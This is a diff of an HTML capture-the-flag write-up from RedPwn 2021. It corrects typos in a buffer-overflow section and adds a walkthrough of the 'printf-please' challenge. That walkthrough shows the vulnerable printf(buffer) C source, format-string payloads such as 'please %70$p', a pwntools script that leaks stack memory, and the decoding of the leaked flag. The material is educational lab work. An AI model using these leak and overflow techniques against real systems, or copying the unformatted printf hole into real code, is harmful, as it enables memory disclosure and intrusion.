@@ -431,7 +431,7 @@ nc mc.ax 31077
 </div></code></code></pre>
 <h4 id="overview-4">Overview:&gt;</h4>
 <ol>
-<li>We have an ELF executible, the source code and a netcat port to connect to at a server. Running the binary prompts the following</li>
+<li>We have an ELF executable, the source code and a netcat port to connect to at a server. Running the binary prompts the following</li>
 </ol>
 <pre><code><code><div>❯ nc mc.ax 31077
 alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
@@ -571,7 +571,7 @@ this is genius!! what do you think?
 <p>Looks like our A's are overflowing the address where segfault is occuring, that is, where the program is trying to return too.</p>
 <ol start="8">
 <li>
-<p>So all we have to do, is replace <code>7fbe2f150041</code> in the dmesg with the adress pointer of our flag printer function, and instead of a Segfault the <code>main()</code> will actually return there, because unlike <code>7fbe2f150041</code>, that address, specifically <code>0x00000000004011f6</code> (found from the disassembly) actually exists.</p>
+<p>So all we have to do, is replace <code>7fbe2f150041</code> in the dmesg with the address pointer of our flag printer function, and instead of a Segfault the <code>main()</code> will actually return there, because unlike <code>7fbe2f150041</code>, that address, specifically <code>0x00000000004011f6</code> (found from the disassembly) actually exists.</p>
 </li>
 <li>
 <p>So we have to write 40A's or NoOps and then fill the next 6 bytes with <code>0000004011f6</code></p>
@@ -600,6 +600,270 @@ flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}
 </div></code></code></pre>
 <p>and we have our flag.</p>
 <h5 id="flag-flagrob-loved-the-challenge-but-im-still-paid-minimum-wage">Flag: flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}</h5>
+<h3 id="pwnprintf-please">pwn/printf-please</h3>
+<hr>
+<h4 id="categeory-binary-exploit-1">Categeory: Binary Exploit</h4>
+<h4 id="difficulty-medium-1">Difficulty: Medium</h4>
+<h4 id="keywords-binary-exploit-format-string-exploit-printf">Keywords: Binary Exploit, Format String Exploit, printf</h4>
+<h4 id="author-therealdarkcoder-5">Author: TheRealDarkCoder</h4>
+<h4 id="prompt-5">Prompt:&gt;</h4>
+<pre><code><code><div>Be sure to say please...
+
+nc mc.ax 31569
+
+</div></code></code></pre>
+<h4 id="overview-5">Overview:&gt;</h4>
+<ol>
+<li>We have a port to connect to, a ELF executable and a source code. Running the binary/connecting to the port prompts the following behaviour</li>
+</ol>
+<pre><code class="language-sh"><div>❯ ./please
+what <span class="hljs-keyword">do</span> you say?
+AABBCCDD
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 4s │ 12:29:09 PM
+❯ ./please
+what <span class="hljs-keyword">do</span> you say?
+please
+please to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:29:12 PM
+❯ ./please
+what <span class="hljs-keyword">do</span> you say?
+please AABBCCDD
+please AABBCCDD to you too!
+</div></code></pre>
+<p>So if we give any input after the keyword <code>please</code>, the program reflects it back to us.</p>
+<ol start="2">
+<li>We take a look at the source code, only one <code>main()</code> function,</li>
+</ol>
+<pre><code class="language-c"><div><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+  <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">0x200</span>];
+  <span class="hljs-keyword">char</span> flag[<span class="hljs-number">0x200</span>];
+
+  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);
+
+  <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buffer));
+  <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));
+
+  <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY);
+  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;failed to read flag. please contact an admin if this is remote&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+  }
+
+  read(fd, flag, <span class="hljs-keyword">sizeof</span>(flag));
+  close(fd);
+
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;what do you say?&quot;</span>);
+
+  read(<span class="hljs-number">0</span>, buffer, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>);
+  buffer[<span class="hljs-built_in">strcspn</span>(buffer, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;
+
+  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(buffer, <span class="hljs-string">&quot;please&quot;</span>, <span class="hljs-number">6</span>)) {
+    <span class="hljs-built_in">printf</span>(buffer);
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; to you too!&quot;</span>);
+  }
+}
+</div></code></pre>
+<p>So the prgram sets a 512 bytes allocation for the buffer and 512 bytes for the flag (0x200 = 512). It then sets the buffer and flag with 0s. The program then opens a <code>flag.txt</code> and reads the file and puts the <code>flag</code> part of the memory.</p>
+<p>The program then asks for useinput, this time using <code>strcspn()</code>, safer then <code>gets()</code> of course. So probably not a buffer overflow. But, if the userinput contains <code>please</code>, it <code>printf()</code>s the entire buffer, and there's the attack vector</p>
+<pre><code class="language-c"><div><span class="hljs-built_in">printf</span>(buffer);
+</div></code></pre>
+<p>No format mentioned. So the program should be vulnerable to format string exploits. Let's try some common attacks.</p>
+<pre><code><code><div>❯ ./please
+what do you say?
+please %d
+please 177207190 to you too!
+ ~/CTF/RedPwn2021/writeup_RedPwn2021/pwn/SOLVED_printf-please │ pwn ?1 12:34:05 PM
+❯ ./please
+what do you say?
+please %p
+please 0x7ffe1cfe98d6 to you too!
+</div></code></code></pre>
+<p>We have memory leaks.</p>
+<ol start="3">
+<li>We make a fake <code>flag.txt</code> file and fill it with <code>AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPP</code>s to simulate the server. Then we write a python script which iterates through some numbers and try to print the i'th pointer in memory using this vulnerability. It is to be noted, we can take the xth address from memory using the format <code>please %x$p</code>. So if we want the 70th address we can input <code>please %70$p</code>\</li>
+</ol>
+<pre><code><code><div>❯ ./please
+what do you say?
+please %70$p
+please 0x5a5a5a5a5a5a5a5a to you too!
+</div></code></code></pre>
+<p>We use pwntools in the python script</p>
+<pre><code class="language-python"><div><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+context.log_level = <span class="hljs-string">&#x27;critical&#x27;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):
+
+
+    <span class="hljs-comment">#s = remote(&#x27;mc.ax&#x27;, 31569)</span>
+    s = process(<span class="hljs-string">&#x27;./please&#x27;</span>)
+
+    s.recvline()
+    s.sendline(<span class="hljs-string">&#x27;please %&#x27;</span> + str(i) + <span class="hljs-string">&#x27;$p&#x27;</span>)
+
+    <span class="hljs-keyword">try</span>:
+        output = str(s.recv())
+        print(str(i) + <span class="hljs-string">&quot; &gt; &quot;</span> + output)
+    <span class="hljs-keyword">except</span>:
+      <span class="hljs-comment">#s.close()</span>
+      s.shutdown()
+
+    <span class="hljs-comment">#s.close()</span>
+    s.shutdown()
+</div></code></pre>
+<p>We get this output</p>
+<details>
+<summary>Output</summary>
+<pre><code><code><div>❯ python3 ape.py
+ape.py:37: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+0 &gt; b'please %0$p to you too!\n'
+1 &gt; b'please 0x7ffc98f47bf6 to you too!\n'
+2 &gt; b'please 0x1 to you too!\n'
+3 &gt; b'please (nil) to you too!\n'
+4 &gt; b'please 0x56304acf5010 to you too!\n'
+5 &gt; b'please 0x7f2c90bafd50 to you too!\n'
+6 &gt; b'please 0x2520657361656c70 to you too!\n'
+7 &gt; b'please 0x702437 to you too!\n'
+8 &gt; b'please (nil) to you too!\n'
+9 &gt; b'please (nil) to you too!\n'
+10 &gt; b'please (nil) to you too!\n'
+11 &gt; b'please (nil) to you too!\n'
+12 &gt; b'please (nil) to you too!\n'
+13 &gt; b'please (nil) to you too!\n'
+14 &gt; b'please (nil) to you too!\n'
+15 &gt; b'please (nil) to you too!\n'
+16 &gt; b'please (nil) to you too!\n'
+17 &gt; b'please (nil) to you too!\n'
+18 &gt; b'please (nil) to you too!\n'
+19 &gt; b'please (nil) to you too!\n'
+20 &gt; b'please (nil) to you too!\n'
+21 &gt; b'please (nil) to you too!\n'
+22 &gt; b'please (nil) to you too!\n'
+23 &gt; b'please (nil) to you too!\n'
+24 &gt; b'please (nil) to you too!\n'
+25 &gt; b'please (nil) to you too!\n'
+26 &gt; b'please (nil) to you too!\n'
+27 &gt; b'please (nil) to you too!\n'
+28 &gt; b'please (nil) to you too!\n'
+29 &gt; b'please (nil) to you too!\n'
+30 &gt; b'please (nil) to you too!\n'
+31 &gt; b'please (nil) to you too!\n'
+32 &gt; b'please (nil) to you too!\n'
+33 &gt; b'please (nil) to you too!\n'
+34 &gt; b'please (nil) to you too!\n'
+35 &gt; b'please (nil) to you too!\n'
+36 &gt; b'please (nil) to you too!\n'
+37 &gt; b'please (nil) to you too!\n'
+38 &gt; b'please (nil) to you too!\n'
+39 &gt; b'please (nil) to you too!\n'
+40 &gt; b'please (nil) to you too!\n'
+41 &gt; b'please (nil) to you too!\n'
+42 &gt; b'please (nil) to you too!\n'
+43 &gt; b'please (nil) to you too!\n'
+44 &gt; b'please (nil) to you too!\n'
+45 &gt; b'please (nil) to you too!\n'
+46 &gt; b'please (nil) to you too!\n'
+47 &gt; b'please (nil) to you too!\n'
+48 &gt; b'please (nil) to you too!\n'
+49 &gt; b'please (nil) to you too!\n'
+50 &gt; b'please (nil) to you too!\n'
+51 &gt; b'please (nil) to you too!\n'
+52 &gt; b'please (nil) to you too!\n'
+53 &gt; b'please (nil) to you too!\n'
+54 &gt; b'please (nil) to you too!\n'
+55 &gt; b'please (nil) to you too!\n'
+56 &gt; b'please (nil) to you too!\n'
+57 &gt; b'please (nil) to you too!\n'
+58 &gt; b'please (nil) to you too!\n'
+59 &gt; b'please (nil) to you too!\n'
+60 &gt; b'please (nil) to you too!\n'
+61 &gt; b'please (nil) to you too!\n'
+62 &gt; b'please (nil) to you too!\n'
+63 &gt; b'please (nil) to you too!\n'
+64 &gt; b'please (nil) to you too!\n'
+65 &gt; b'please (nil) to you too!\n'
+66 &gt; b'please (nil) to you too!\n'
+67 &gt; b'please (nil) to you too!\n'
+68 &gt; b'please (nil) to you too!\n'
+69 &gt; b'please (nil) to you too!\n'
+70 &gt; b'please 0x4444434342424141 to you too!\n'
+71 &gt; b'please 0x4848474746464545 to you too!\n'
+72 &gt; b'please 0x4c4c4b4b4a4a4949 to you too!\n'
+73 &gt; b'please 0x50504f4f4e4e4d4d to you too!\n'
+74 &gt; b'please (nil) to you too!\n'
+75 &gt; b'please (nil) to you too!\n'
+76 &gt; b'please (nil) to you too!\n'
+77 &gt; b'please (nil) to you too!\n'
+78 &gt; b'please (nil) to you too!\n'
+79 &gt; b'please (nil) to you too!\n'
+80 &gt; b'please (nil) to you too!\n'
+81 &gt; b'please (nil) to you too!\n'
+82 &gt; b'please (nil) to you too!\n'
+83 &gt; b'please (nil) to you too!\n'
+84 &gt; b'please (nil) to you too!\n'
+85 &gt; b'please (nil) to you too!\n'
+86 &gt; b'please (nil) to you too!\n'
+87 &gt; b'please (nil) to you too!\n'
+88 &gt; b'please (nil) to you too!\n'
+89 &gt; b'please (nil) to you too!\n'
+90 &gt; b'please (nil) to you too!\n'
+91 &gt; b'please (nil) to you too!\n'
+92 &gt; b'please (nil) to you too!\n'
+93 &gt; b'please (nil) to you too!\n'
+94 &gt; b'please (nil) to you too!\n'
+95 &gt; b'please (nil) to you too!\n'
+96 &gt; b'please (nil) to you too!\n'
+97 &gt; b'please (nil) to you too!\n'
+98 &gt; b'please (nil) to you too!\n'
+99 &gt; b'please (nil) to you too!\n'
+
+</div></code></code></pre>
+</details>
+<p>If you observe carefully, you'll see that for i = 70 through 74, we get 0x4444434342424141, which is the hex of ASCII AABBCCDD, part of our flag. So we're pretty sure that's where our flag is. Let's write a python script to get those parts and attach them together. We also note that the bytes are reversed, probably endianness issue.</p>
+<ol start="4">
+<li>
+<p>We modify the python script. The idea is</p>
+<ol>
+<li>We iterate 5 times to get the bytes for 70 to 75th pointers of the memory in the remote server.</li>
+<li>We take the output. It's formatted as <code>b'please 0x4444434342424141 to you too!\n'</code>. So we remove the first 9 characters, and last 15 characters to isolate the value we need.</li>
+<li>We remove the 0x and append them into a long string of all characters.</li>
+<li>We iterate through the string, taking 2 characters each time to represent a byte and put them in <code>flag_bytes</code></li>
+</ol>
+<pre><code><code><div>flag_bytes = [&quot;44&quot;, &quot;&quot;44&quot;, &quot;43&quot;, &quot;43&quot;, ...]
+</div></code></code></pre>
+<ol start="5">
+<li>Once we write 8 bytes, we convert it into one word and put them in flag_word. This is done because we get 8 bytes from each server connection and this helps to isolate each returns and reverse them later.</li>
+</ol>
+<pre><code><code><div>flag_words = [['44', '44', '43', '43', '42', '42', '41', '41'], ['48', '48', '47', '47', '46', '46', '45', '45'], ['4c', '4c', '4b', '4b', '4a', '4a', '49', '49'], ['50', '50', '4f', '4f', '4e', '4e', '4d', '4d']]
+</div></code></code></pre>
+<ol start="6">
+<li>We take each word, reverse them, convert each byte into printable ASCII, put them in a list and join them to get the flag,</li>
+</ol>
+</li>
+</ol>
+<pre><code><code><div>flag{pl3as3_pr1ntf_w1th_caut10n_
+</div></code></code></pre>
+<p>is what we get from the program. We don't get the last word because it's short of 3 bits. So we modify the python script to add 3 0's before the last output (before because once it's reversed it'll go to the end.)</p>
+<ol start="7">
+<li>Run the script and we have a flag.</li>
+</ol>
+<pre><code><code><div>❯ python3 ape.py
+ape.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  s.sendline('please %' + str(i) + '$p')
+336c707b67616c66
+6e3172705f337361
+5f687431775f6674
+5f6e303174756163
+a7d6c78336139
+flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}
+\x00
+</div></code></code></pre>
+<p>Refer to the python script for more clearance, it's not the most efficient solution but enough to explain the workflow.</p>
+<h5 id="flag-flagpl3as3_pr1ntf_w1th_caut10n_9a3xl">Flag: flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}</h5>
 
     </body>
     </html>
